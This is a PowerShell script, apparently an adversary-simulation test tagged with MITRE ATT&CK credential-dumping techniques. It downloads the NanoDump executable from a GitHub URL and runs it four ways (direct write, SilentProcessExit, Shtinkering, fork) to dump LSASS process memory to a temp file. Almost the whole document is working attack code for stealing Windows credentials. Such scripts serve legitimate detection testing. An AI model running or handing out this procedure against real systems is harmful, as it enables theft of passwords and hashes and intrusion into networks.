<#
    T1003.001 - OS Credential Dumping: LSASS Memory
    T1204.002 - User Execution: Malicious File
    T1588.001 - Obtain Capabilities: Malware
    Dump lsass with NanoDump (multiple methods for lsass dumping)
    Download NanoDump from project https://github.com/helpsystems/nanodump/tree/main/dist and execute it with differents techniques
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

$dumpfile = "$env:tmp\nano_lsassdump.dmp"
$outfile = "$env:tmp\nanodmp.exe"
$x32 = "https://raw.githubusercontent.com/helpsystems/nanodump/main/dist/nanodump.x86.exe"
$x64 = "https://raw.githubusercontent.com/helpsystems/nanodump/main/dist/nanodump.x64.exe"

try{
    $os = Get-WmiObject Win32_OperatingSystem
    if($os.OSArchitecture -eq "32-bit"){
        Invoke-WebRequest $x32 -OutFile $outfile
    }
    elseif($os.OSArchitecture -eq "64-bit"){
        Invoke-WebRequest $x64 -OutFile $outfile
    }
    else{
        Write-Host -ForegroundColor Red "Error: Cannot detect OS Version, os = $os"
        exit 1
    }
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: nanodump downloaded to $outfile"
        Write-Host -ForegroundColor Cyan "`nmethod  --write: nanodump will create the dump" 
        & $outfile --write $dumpfile
        Write-Host -ForegroundColor Cyan "`nmethod --silent-process-exit: WerFault will create the dump via SilentProcessExit"
        & $outfile --silent-process-exit $dumpfile
        Write-Host -ForegroundColor Cyan "`nmethod --shtinkering: WerFault will create the dump via Shtinkering (must be SYSTEM)"
        & $outfile --shtinkering $dumpfile
        Write-Host -ForegroundColor Cyan "`nmethod --fork --write: Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature"
        & $outfile --fork --write $dumpfile
        if(test-path $dumpfile){
            Write-Host -ForegroundColor Green "Success: Dumped lsass.exe memory to $dumpfile"
        }
        else{
            Write-Host -ForegroundColor Red "Error: Failed to Dump lsass.exe memory to $dumpfile"
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error: nanodump not found in $outfile"
    }

}
catch{
    Write-Error $_
}

Stop-Transcript
